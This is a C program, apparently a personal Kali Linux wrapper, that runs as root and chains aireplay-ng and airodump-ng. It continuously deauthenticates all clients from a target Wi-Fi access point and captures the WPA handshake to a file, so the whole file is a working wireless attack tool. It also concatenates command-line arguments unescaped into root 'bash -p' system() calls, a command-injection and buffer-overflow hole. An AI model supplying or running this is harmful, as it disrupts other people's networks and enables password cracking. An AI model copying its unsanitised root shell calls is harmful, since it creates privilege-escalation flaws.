#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char** argv) {
	setuid(0);
	setgid(0);
	if (*(argv + 1) == NULL || *(argv + 2) == NULL || *(argv + 3) == NULL){
		printf("\n3 BSSID CHANNEL ESSID!");
		exit(0);
	}	

	//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/// DEAUTHENTICATING CLIENTS IN THE BACKGROUND
	char command[2048];
	strcpy(command, "/bin/bash -pc \"nohup aireplay-ng -0 0 -a ");
	strcat(command, *(argv + 1));
	strcat(command, " wlan1mon &\"");
	printf("Command: %s\n", command);
	////      _______________________________ P R O B L E M S T E L L E ___________________________________________________
	///                              DAS PROBLEM LIEGT DARIn, dass ich auf einen BEACON vom router warten muss, theoretisch könnte ich einen service daraus machen und dort Restart=always setzen und den service dann löschen oder ausmachen wenn ich ihn nicht mehr bracuhe
	system(command);
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	// DELETEING nohup.out because its sooooooo big i think, last time it was, good practise not to have 2 times same output
	system("/bin/bash -pc \"rm /home/kali/nohup.out\"");
	///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/// STARTING TO CAPTURE HANDSHAKE INTHE FOREGROUND 
	char command2[2048];
	strcpy(command2, "/bin/bash -pc \"airodump-ng -c ");
	strcat(command2, *(argv + 2));
	strcat(command2, " -w ");
	strcat(command2, *(argv + 3));
	strcat(command2, " --bssid ");
	strcat(command2, *(argv +1));
	strcat(command2, " wlan1mon\"");
	printf("\nCommand: %s\n", command2);
       	system(command2);	
	// THE ABOVE COMMAND (command2) gets executed until its exited by typing qq, so then the program should quit

	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	///QUITTING DEAUTHENTICATION PROCESS
	///
	/// FRIST: GETTING THE PID TO KILL IT
	//ps aux | grep -i "aireplay-ng -0 0 -a" | grep -v grep | grep -oE "[0-9]{1,7}" | head -n 1
	const char *command3 = "/bin/bash -pc \'ps aux | grep -i \"aireplay-ng -0 0 -a\" | grep -v grep | grep -oE \"[0-9]{1,7}\" | head -n 1\'";
	printf("Command: %s\n", command3);
	FILE *fp;
	char output[1024];
	output[0]='\0';
	fp = popen(command3, "r");
	while (fgets(output, sizeof(output), fp) != NULL) {
		
	}
	printf("\nPID: %s", output);
	
	/// THEN: KILLING THE PROCESS 
	char command4[60];
	strcpy(command4, "/bin/bash -pc \"kill ");
	strcat(command4, output);
	strcat(command4, "\"");
	system(command4);	
	
	pclose(fp);
	return 0;

}
